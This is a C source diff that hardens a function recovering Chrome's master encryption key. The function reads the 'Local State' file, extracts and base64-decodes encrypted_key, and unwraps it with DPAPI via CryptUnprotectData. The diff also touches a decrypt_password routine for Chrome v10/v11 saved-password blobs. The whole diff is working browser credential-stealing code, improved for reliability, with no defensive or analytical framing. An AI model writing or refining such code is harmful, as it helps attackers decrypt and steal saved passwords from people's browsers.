@@ -38,8 +38,10 @@ char* get_master_key() {
         "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
         path, MAX_PATH);
 
-
     char* content = read_file(path, NULL);
+    if (!content) {
+        return NULL;
+    }
 
     // Find encrypted_key inside "os_crypt":{"encrypted_key":"..."}
     char* key_str = strstr(content, "\"encrypted_key\":\"");
@@ -50,10 +52,31 @@ char* get_master_key() {
 
     key_str += 17;
     const char* end = strstr(key_str, "\"");
+    if (!end) {
+        free(content);
+        return NULL;
+    }
+    
     int b64_len = end - key_str;
 
+    // null terminate the fucking key string
+    char* b64_string = (char*)malloc(b64_len + 1);
+    if (!b64_string) {
+        free(content);
+        return NULL;
+    }
+    memcpy(b64_string, key_str, b64_len);
+    b64_string[b64_len] = '\0';
+    
     unsigned char* b64_decoded = (unsigned char*)malloc(b64_len); // over-allocating here
-    int decoded_len = b64_decode(key_str, b64_decoded);
+    if (!b64_decoded) {
+        free(b64_string);
+        free(content);
+        return NULL;
+    }
+    
+    int decoded_len = b64_decode(b64_string, b64_decoded);
+    free(b64_string);
 
     // check if first 5 bytes are "DPAPI"
     if (memcmp(b64_decoded, "DPAPI", 5) != 0) {
@@ -68,6 +91,12 @@ char* get_master_key() {
 
     if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
         char* master_key = malloc(out.cbData + 1);
+        if (!master_key) {
+            LocalFree(out.pbData);
+            free(b64_decoded);
+            free(content);
+            return NULL;
+        }
         memcpy(master_key, out.pbData, out.cbData);
         master_key[out.cbData] = 0;
         LocalFree(out.pbData);
@@ -80,7 +109,6 @@ char* get_master_key() {
     free(content);
     return NULL;
 }
-
 int decrypt_password(BYTE* encrypted, int enc_len, char* master_key, char* out_password, int out_size) {
     // Chrome v80+ format: v10 + 12-byte IV + ciphertext + 16-byte tag
     if (enc_len < 3 || memcmp(encrypted, "v10", 3) != 0 && memcmp(encrypted, "v11", 3) != 0) {
